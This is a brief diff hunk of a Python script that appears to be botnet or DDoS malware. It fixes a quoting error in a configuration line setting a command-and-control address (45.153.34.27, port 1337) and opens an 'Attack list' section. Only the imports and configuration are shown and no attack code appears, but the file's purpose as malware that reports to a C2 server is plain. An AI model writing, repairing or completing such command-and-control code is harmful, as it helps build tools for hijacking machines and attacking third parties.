@@ -1,7 +1,7 @@
 import subprocess, random, os, time, threading, socket
 
 # Configuration
-C2_ADDRESS  = ""45.153.34.27
+C2_ADDRESS  = "45.153.34.27"
 C2_PORT     = 1337
 
 # Attack list
